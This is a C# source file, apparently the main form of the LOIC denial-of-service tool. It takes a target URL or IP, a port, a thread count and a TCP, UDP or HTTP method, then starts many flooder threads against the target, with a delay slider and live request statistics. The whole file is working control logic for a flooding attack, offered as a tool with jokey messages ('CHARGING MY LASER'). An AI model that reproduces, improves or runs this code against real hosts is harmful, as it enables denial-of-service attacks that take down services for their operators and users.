using System;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Windows.Forms;

namespace LOIC
{
	public partial class frmMain : Form
	{
		#region Fields
		private bool attack;
		private static IFlooder[] arr;

		private static string sIP, sData, sSubsite;
		private static int iPort, iThreads, iProtocol, iDelay, iTimeout;
		private static bool bResp, intShowStats;
		#endregion

		#region Constructors
		public frmMain()
		{
			InitializeComponent();
		}
		#endregion

		#region Event handlers
		private void frmMain_Load(object sender, EventArgs e)
		{
			this.Text = String.Format("{0} | When harpoons, air strikes and nukes fails | v. {1}", Application.ProductName, Application.ProductVersion);
		}

		private void cmdTargetURL_Click(object sender, EventArgs e)
		{
			string url = txtTargetURL.Text.ToLower();
			if (url.Length == 0)
			{
				using (var frmWtf = new frmWtf())
				{
					frmWtf.Show();
					MessageBox.Show("A URL is fine too...", ".");
				}
				return;
			}

			if (!url.StartsWith("http://") && !url.StartsWith("https://")) url = String.Concat("http://", url);
			try
			{
				IPAddress[] addresses = Dns.GetHostEntry(new Uri(url).Host).AddressList;
				txtTarget.Text = (addresses.Length > 1 ? addresses[new Random().Next(addresses.Length)] : addresses.First()).ToString();
			}
			catch
			{
				using (var frmWtf = new frmWtf())
				{
					frmWtf.Show();
					MessageBox.Show("Write the complete address", ".");
				}
			}
		}

		private void cmdTargetIP_Click(object sender, EventArgs e)
		{
			if (txtTargetIP.Text.Length == 0)
			{
				using (var frmWtf = new frmWtf())
				{
					frmWtf.Show();
					MessageBox.Show("I think you forgot the IP.");
				}
				return;
			}
			txtTarget.Text = txtTargetIP.Text;
		}

		private void txtTarget_Enter(object sender, EventArgs e)
		{
			cmdAttack.Focus();
		}

		private void cmdAttack_Click(object sender, EventArgs e)
		{
			if (!attack)
			{
				attack = true;
				try
				{
					sIP = txtTarget.Text;

					if (!Int32.TryParse(txtPort.Text, out iPort))
						throw new Exception("I don't think ports are supposed to be written like THAT.");

					if (!Int32.TryParse(txtThreads.Text, out iThreads))
						throw new Exception("What on earth made you put THAT in the threads field?");

					if (String.IsNullOrEmpty(txtTarget.Text) || String.Equals(txtTarget.Text, "N O N E !"))
						throw new Exception("Select a target.");

					iProtocol = 0;
					switch (cbMethod.Text)
					{
						case "TCP": iProtocol = 1; break;
						case "UDP": iProtocol = 2; break;
						case "HTTP": iProtocol = 3; break;
						default: throw new Exception("Select a proper attack method.");
					}

					sData = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
					if (String.IsNullOrEmpty(sData) && (iProtocol == 1 || iProtocol == 2))
						throw new Exception("Going to spam with no contents?");

					if (!txtSubsite.Text.StartsWith("/") && (iProtocol == 3))
						throw new Exception("You have to enter a subsite (for example \"/\")");
					else
						sSubsite = txtSubsite.Text;

					if (!Int32.TryParse(txtTimeout.Text, out iTimeout))
						throw new Exception("What's up with something like that in the timeout box?");

					bResp = chkResp.Checked;
				}
				catch (Exception ex)
				{
					using (var frmWtf = new frmWtf())
					{
						frmWtf.Show();
						MessageBox.Show(ex.Message, "ERROR.");
					}
					attack = false;
					return;
				}

				cmdAttack.Text = "Stop flooding";

				switch (iProtocol)
				{
					case 1:
					case 2:
						{
							arr = Enumerable.Range(0, iThreads)
								.Select(i => new XXPFlooder(sIP, iPort, iProtocol, iDelay, bResp, sData))
								.ToArray();
							break;
						}
					case 3:
						{
							arr = Enumerable.Range(0, iThreads)
								.Select(i => new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout))
								.ToArray();
							break;
						}
				}

				foreach (IFlooder f in arr)
				{
					f.Start();
				}
				tShowStats.Start();
			}
			else
			{
				attack = false;
				cmdAttack.Text = "CHARGING MY LASER";

				foreach (IFlooder f in arr)
				{
					f.Stop();
				}
				tShowStats.Stop();

				arr = null;
			}
		}

		private void tShowStats_Tick(object sender, EventArgs e)
		{
			if (intShowStats) return; intShowStats = true;

			bool isFlooding = false;
			switch (iProtocol)
			{
				case 1:
				case 2:
					{
						int iFloodCount = arr.Cast<XXPFlooder>().Sum(f => f.FloodCount);
						lbRequested.Text = iFloodCount.ToString(CultureInfo.InvariantCulture);
						break;
					}
				case 3:
					{
						int iIdle = 0;
						int iConnecting = 0;
						int iRequesting = 0;
						int iDownloading = 0;
						int iDownloaded = 0;
						int iRequested = 0;
						int iFailed = 0;

						for (int a = 0; a < arr.Length; a++)
						{
							HTTPFlooder httpFlooder = (HTTPFlooder)arr[a];
							iDownloaded += httpFlooder.Downloaded;
							iRequested += httpFlooder.Requested;
							iFailed += httpFlooder.Failed;
							switch (httpFlooder.State)
							{
								case ReqState.Ready:
								case ReqState.Completed:
									{
										iIdle++;
										break;
									}
								case ReqState.Connecting:
									{
										iConnecting++;
										break;
									}
								case ReqState.Requesting:
									{
										iRequesting++;
										break;
									}
								case ReqState.Downloading:
									{
										iDownloading++;
										break;
									}
							}
							if (isFlooding && !httpFlooder.IsFlooding)
							{
								int iaDownloaded = httpFlooder.Downloaded;
								int iaRequested = httpFlooder.Requested;
								int iaFailed = httpFlooder.Failed;
								httpFlooder = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout)
								{
									Downloaded = iaDownloaded,
									Requested = iaRequested,
									Failed = iaFailed
								};
								httpFlooder.Start();
								arr[a] = httpFlooder;
							}
						}
						lbFailed.Text = iFailed.ToString(CultureInfo.InvariantCulture);
						lbRequested.Text = iRequested.ToString(CultureInfo.InvariantCulture);
						lbDownloaded.Text = iDownloaded.ToString(CultureInfo.InvariantCulture);
						lbDownloading.Text = iDownloading.ToString(CultureInfo.InvariantCulture);
						lbRequesting.Text = iRequesting.ToString(CultureInfo.InvariantCulture);
						lbConnecting.Text = iConnecting.ToString(CultureInfo.InvariantCulture);
						lbIdle.Text = iIdle.ToString(CultureInfo.InvariantCulture);
						break;
					}
			}

			intShowStats = false;
		}

		private void tbSpeed_ValueChanged(object sender, EventArgs e)
		{
			iDelay = tbSpeed.Value;
			if (arr != null)
			{
				foreach (var f in arr)
				{
					f.Delay = iDelay;
				}
			}
		}
		#endregion
	}
}
